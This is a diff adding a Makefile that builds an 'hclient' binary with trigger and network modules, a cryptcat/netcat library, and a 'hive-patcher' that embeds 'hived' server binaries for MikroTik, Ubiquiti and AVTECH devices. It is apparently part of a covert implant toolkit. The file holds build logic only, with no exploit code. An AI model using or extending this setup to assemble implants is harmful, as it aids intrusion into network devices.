@@ -1,0 +1,255 @@
+SHELL := $(shell which bash)
+
+# Defaults
+CFLAGS	:= -Wall -W -Wdeclaration-after-statement
+
+SHELL := $(shell which bash)
+CC := $(shell which gcc)
+GCCVERSION_GT_4.6 = $(shell expr `${CC} -dumpversion | cut -f1,2 -d.` \>= 4.6)
+MD5SUM := $(shell which md5sum)
+STRIP := $(shell which strip)
+
+BINARY = hclient-$(TARGET)
+
+COMMON = ../common
+CRYPTO = $(COMMON)/crypto
+SSL = $(COMMON)/ssl/library
+INCLUDES = -I$(SSL)/../include -I$(CRYPTO) -I$(COMMON)/debug
+LIBSSL = $(SSL)/libpolarssl.a
+LIBCRYPTO = $(CRYPTO)/libcrypto.a
+STRINGS = $(COMMON)/strings
+LIBDEBUG = $(COMMON)/debug/libdebug.a
+
+.PHONY: ARCH_BUILD
+include ARCH_BUILD
+ifeq ("$(TARGET)", "linux-x86-client")
+  include $(COMMON)/Makefile-include.linux-x86-client
+else ifeq ("$(TARGET)", "linux-x86_64")
+  include $(COMMON)/Makefile-include.linux-x86_64
+endif
+
+.PHONY: force-rebuild
+$(info )
+$(info =========================================================================)
+ifdef ARCH_BUILD_CLIENT
+  ifneq ("$(ARCH_BUILD_CLIENT)", "$(TARGET)")
+    CLIENT_REBUILD:=clean
+    $(info .       Rebuilding CLIENT)
+  else
+    CLIENT_REBUILD:=
+    $(info .       CLIENT for $(TARGET) previously built.)
+  endif
+else
+  CLIENT_REBUILD:=clean
+    $(info .       Building CLIENT)
+endif
+
+ifdef ARCH_BUILD_CRYPTO
+  ifneq ("$(ARCH_BUILD_CRYPTO)", "$(TARGET)")
+    CRYPTO_REBUILD:=force-rebuild
+  else
+    CRYPTO_REBUILD:=
+  endif
+else
+  CRYPTO_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_SSL
+  ifneq ("$(ARCH_BUILD_SSL)", "$(TARGET)")
+    SSL_REBUILD:=force-rebuild
+  else
+    SSL_REBUILD:=
+  endif
+else
+  SSL_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_DEBUG
+  ifneq ("$(ARCH_BUILD_DEBUG)", "$(TARGET)")
+    DEBUG_REBUILD:=force-rebuild
+  else
+    DEBUG_REBUILD:=
+  endif
+else
+  DEBUG_REBUILD:=force-rebuild
+endif
+
+LDFLAGS = -lpthread
+
+ifeq "$(GCCVERSION_GT_4.6)" "1"
+	CFLAGS += -Wno-unused-result
+endif
+
+CFLAGS += $(INCLUDES)
+
+CRYPTCAT = -DLINUX cryptcat/netcat.c
+#CRYPTCAT = -DLINUX -lstdc++ cryptcat/farm9crypt.cc cryptcat/twofish.cc cryptcat/netcat.c
+LIBFILES = trigger_utils.c trigger_network.c trigger_protocols.c
+
+OBJS =	main.o functions.o misc.o modes.o parser.o \
+	trigger.o trigger_network.o \
+	trigger_protocols.o b64.o trigger_utils.o threads.o \
+	$(STRINGS)/string_utils.o init_strings.o
+
+LIBS = $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)
+
+#UNPATCHED_SOLARIS_X86 = hived-solaris-x86-unpatched
+UNPATCHED_LINUX_X86 = hived-linux-x86-unpatched
+UNPATCHED_MIKROTIK_X86 = hived-mikrotik-x86-unpatched
+UNPATCHED_MIKROTIK_MIPS = hived-mikrotik-mips-unpatched
+#UNPATCHED_MIKROTIK_MIPSEL = hived-mikrotik-mipsel-unpatched
+UNPATCHED_MIKROTIK_PPC = hived-mikrotik-ppc-unpatched
+UNPATCHED_UBIQUITI_MIPS = hived-ubiquiti-mips-unpatched
+UNPATCHED_AVTECH_ARM = hived-avtech-arm-unpatched
+
+UNPATCHED_BINS =
+#UNPATCHED_BINS += $(UNPATCHED_SOLARIS_SPARC)
+UNPATCHED_BINS += $(UNPATCHED_LINUX_X86)
+UNPATCHED_BINS += $(UNPATCHED_SOLARIS_X86)
+UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_X86)
+UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_MIPS)
+UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_PPC)
+#UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_MIPSEL)
+UNPATCHED_BINS += $(UNPATCHED_UBIQUITI_MIPS)
+UNPATCHED_BINS += $(UNPATCHED_AVTECH_ARM)
+
+# Debug Configuration
+ifdef DEBUG
+  ifeq ("$(DEBUG)", "1")	
+    CFLAGS += -g -O0
+  endif
+  LIBS += $(LIBDEBUG)
+  ifeq ("$(DEBUG)", "2")	
+    CFLAGS += -DDEBUG -D_DEBUG -g -O0
+  endif
+  ifeq ("$(DEBUG)", "3")	
+    CFLAGS += -DPOLARSSL_DEBUG_C -DPOLARSSL_DEBUG_MSG
+  endif
+else
+  CFLAGS += -Os
+  LIBDEBUG :=
+endif
+
+$(info =========================================================================)
+$(info .  TARGET: $(TARGET))
+$(info .  SRCDIR: $(PWD))
+$(info .      CC: $(CC))
+$(info .  CFLAGS: $(CFLAGS))
+$(info . LDFLAGS: $(LDFLAGS))
+$(info =========================================================================)
+$(info )
+
+.SILENT:
+
+.PHONY: all
+all: hclient debug
+
+.PHONY: release
+release: hclient
+
+.PHONY: hclient
+hclient: $(CLIENT_REBUILD) proj_strings.h $(LIBCRYPTO) $(LIBSSL) $(OBJS) $(LIBDEBUG)
+	if ! test $(DEBUG); then \
+		${CC} ${CFLAGS} -o ${BINARY} ${OBJS} $(LIBS) ${LDFLAGS}; \
+		${STRIP} ${BINARY};	\
+		${MD5SUM} ${BINARY} > ${BINARY}.md5; \
+	else \
+		printf "\n\tCREATING DEBUG VERSION OF $@\n\n"; \
+		printf "\tLD\t\t$@-dbg\n"; \
+		${CC} ${CFLAGS} -o ${BINARY}-dbg ${OBJS} $(LIBS) ${LDFLAGS}; \
+		${MD5SUM} ${BINARY}-dbg > ${BINARY}-dbg.md5; \
+	fi
+	echo "ARCH_BUILD_CLIENT=$(TARGET)" > ARCH_BUILD
+	printf "\n\tCLIENT BUILD COMPLETE\n\n"
+
+$(LIBSSL): $(SSL_REBUILD)
+	cd $(SSL) && $(MAKE) DEBUG=$(DEBUG) TARGET=$(TARGET)
+
+$(LIBCRYPTO): $(CRYPTO_REBUILD)
+	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)
+
+$(LIBDEBUG): $(DEBUG_REBUILD)
+	cd $(COMMON)/debug && $(MAKE) TARGET=$(TARGET)
+
+.PHONY: debug
+debug: strings $(LIBSSL) $(LIBCRYPTO) $(OBJS) $(LIBDEBUG)
+	${CC} ${CFLAGS} -o ${BINARY}-dbg ${OBJS} $(LIBS) ${LDFLAGS} 
+	md5sum ${BINARY}-dbg > ${BINARY}-dbg.md5
+
+library: strings
+	${CC} $(CFLAGS) -c $(LIBFILES)
+	ar rv libhclient.a *.o
+	ranlib libhclient.a
+	echo "ARCH_BUILD_CLIENTLIB=$(TARGET)" >> ARCH_BUILD
+
+libcryptcat: cryptcat/farm9crypt.o cryptcat/twofish2.o
+	${CC} -c $(CFLAGS) $(CRYPTCAT) 
+	ar rv libcryptcat.a netcat.o farm9crypt.o twofish2.o
+	ranlib libcryptcat.a
+
+cryptcat/farm9crypt.o: cryptcat/farm9crypt.cc cryptcat/farm9crypt.h
+	${CC} -c $(CFLAGS) cryptcat/farm9crypt.cc
+
+cryptcat/twofish2.o: cryptcat/twofish2.cc cryptcat/twofish2.h
+	${CC} -c $(CFLAGS) cryptcat/twofish2.cc
+
+.PHONY: strings
+strings: init_strings.o $(STRINGS)/string_utils.o 
+
+proj_strings.h:
+	printf "\tGenerating\t$@\n"
+	python mod_gen_string_header.py client_strings.txt SERVER_STRINGS
+
+init_strings.o: init_strings.c $(STRINGS)/string_utils.o
+	${CC} ${CFLAGS} -c init_strings.c
+
+init_strings.c: client_strings.txt $(STRINGS)/string_utils.h
+	python mod_gen_string_header.py client_strings.txt CLIENT_STRINGS
+
+$(STRINGS)/string_utils.o:  $(STRINGS_REBUILD) $(STRINGS)/string_utils.h
+	printf "\tCC\t\t$<\n"
+	cd $(STRINGS) && $(MAKE) TARGET=$(TARGET)
+
+.PHONY: bin-links
+bin-links:	# Install symbolic links to binaries in the server directory
+	for l in $(UNPATCHED_BINS); do \
+		if ! test -L $$l; then \
+			printf "Adding symlink to binary $${l%%-unpatched}\n"; \
+			ln -s ../server/$${l%%-unpatched} $$l; \
+		fi; \
+	done; \
+	printf "\n"
+
+.PHONY: patcher
+patcher: bin-links $(UNPATCHED_BINS)
+	printf "=========================================================================\n"
+	printf "\tBUILDING PATCHER\n"
+	printf "=========================================================================\n"
+	printf "\nThe latest binaries must be present in the server directory.\n"
+	printf "The following binaries were found:\n\n"
+	@ls -l ../server/hived-* | grep -v dbg | grep -v md5
+	printf "\n"
+	printf "Generating header files...\n"
+	xxd -i $(UNPATCHED_LINUX_X86) _unpatched_linux_x86.h
+	xxd -i $(UNPATCHED_MIKROTIK_X86) _unpatched_mikrotik_x86.h
+	xxd -i $(UNPATCHED_MIKROTIK_MIPS) _unpatched_mikrotik_mips.h
+#	xxd -i $(UNPATCHED_MIKROTIK_MIPSEL) _unpatched_mikrotik_mipsel.h
+	xxd -i $(UNPATCHED_MIKROTIK_PPC) _unpatched_mikrotik_ppc.h
+#	xxd -i $(UNPATCHED_SOLARIS_X86) _unpatched_solaris_x86.h
+	xxd -i $(UNPATCHED_UBIQUITI_MIPS) _unpatched_ubiquiti_mips.h
+	xxd -i $(UNPATCHED_AVTECH_ARM) _unpatched_avtech_arm.h
+
+	printf "Compiling patcher...\n"
+	$(CC) $(CFLAGS) -I. $(STRINGS)/string_utils.c patcher.c -o hive-patcher $(LIBSSL)
+	strip hive-patcher
+	md5sum hive-patcher > hive-patcher.md5
+
+.c.o:
+	printf "\tCC\t$<\n"
+	$(CC) $(CFLAGS) -c $<
+
+.PHONY: clean
+clean:
+	rm -f $(OBJS)
+	rm -f proj_strings.h
+	>ARCH_BUILD
